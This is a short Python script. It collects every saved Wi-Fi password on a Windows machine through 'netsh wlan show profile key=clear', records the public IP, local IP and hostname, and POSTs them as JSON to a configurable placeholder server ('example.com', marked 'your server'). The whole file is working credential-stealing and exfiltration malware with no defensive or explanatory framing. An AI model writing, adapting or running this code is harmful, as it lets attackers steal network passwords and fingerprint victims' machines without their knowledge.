import os
import requests
import socket

usernameOfPC = os.getlogin()
# Your server URL
server_url = f"https://example.com" # your server
wifiNamesList = []
passwordsDict = {}


def getPublicIP():
    try:
        response = requests.get("https://httpbin.org/ip")
        data = response.json()
        passwordsDict["Public-IP"] = data["origin"]
    except Exception as e:
        print(f"Error accured in getPublicIP function: {e}")


def getLocalIPandHostname():
    try:
        hostname = socket.gethostname()
        LocalIP = socket.gethostbyname(hostname)
        passwordsDict["Hostname"] = hostname
        passwordsDict["Local-IP"] = LocalIP
    except Exception as e:
        print(f"Error accured in getLocalIPandHostname function: {e}")


def sendDataToServer(url):
    try:
        # Send a POST request
        response = requests.post(f"{url}/{passwordsDict['Hostname']}", json=passwordsDict)

        if response.status_code == 200:
            print("Data sent successfully.")
        else:
            print("Failed to send data. Status code:", response.status_code)
            print("Response content:", response.text)
    except Exception as e:
        print(f"Error accured in sendDataToServer function: {e}")


# ---------------------------------------------------------------------------------------------Main

def getWifiPasswords():
    readCmd = os.popen('netsh wlan show profile').readlines()
    # print("Networks Found:\n")
    for output in readCmd:
        if "All User Profile" in output:
            wifiNamesList.append(output[output.rfind(':') + 2:].strip())

    for network in wifiNamesList:
        PasswordOutput = (os.popen('netsh wlan show profile {0} key=clear'.format(network)).readlines())
        for line in PasswordOutput:
            if "Key Content" in line:
                password = line[line.rfind(':') + 2:].replace("\n", "")
                passwordsDict[f"{network}"] = password
                # print(f'{network} : {password}')
try:

    getPublicIP()
    getLocalIPandHostname()
    getWifiPasswords()
    sendDataToServer(server_url)
except Exception as e:
    print(f"Error accured running Main: {e}")

# input()
